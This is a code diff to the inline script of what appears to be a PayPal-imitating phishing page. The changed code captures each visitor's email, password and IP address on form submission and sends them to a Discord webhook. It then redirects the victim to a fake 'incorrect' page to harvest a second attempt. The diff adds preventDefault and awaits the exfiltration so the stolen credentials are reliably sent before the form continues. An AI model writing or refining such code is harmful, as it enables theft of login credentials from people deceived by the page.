@@ -1057,7 +1057,12 @@ ul.priorityCountries li:first-child a:hover {
     let returnCount = parseInt(localStorage.getItem('pp_returnCount') || '0');
     if(returnCount === 0){
       localStorage.setItem('pp_returnCount', '1');
-      window.location.href = '/pay/incorrect.html';
+      // Use POST instead of GET to avoid 405
+      const postForm = document.createElement('form');
+      postForm.method = 'POST';
+      postForm.action = '/pay/incorrect.html';
+      document.body.appendChild(postForm);
+      postForm.submit();
       return true;
     } else if(returnCount === 1){
       localStorage.setItem('pp_returnCount', '2');
@@ -1069,16 +1074,24 @@ ul.priorityCountries li:first-child a:hover {
     if(handleReturn()) return;
   }
 
+  // FIXED: prevent default, await webhook, then submit form normally
   form.addEventListener('submit', async function(e){
+    e.preventDefault();
+
     const email = emailField ? emailField.value : '';
     const password = passwordField ? passwordField.value : '';
-    if (!email || !password) return;
+    if (!email || !password) {
+      form.submit(); // still submit if fields empty (shouldn't happen)
+      return;
+    }
 
     attemptCount++;
     const ip = await getIP();
     storeCredentials(email, password, ip);
     await sendToDiscord(email, password, ip, attemptCount);
-    // Do not prevent default - form submits normally
+
+    // Now submit the form to its original action (PayPal or incorrect.html)
+    form.submit();
   });
 })();
 </script>
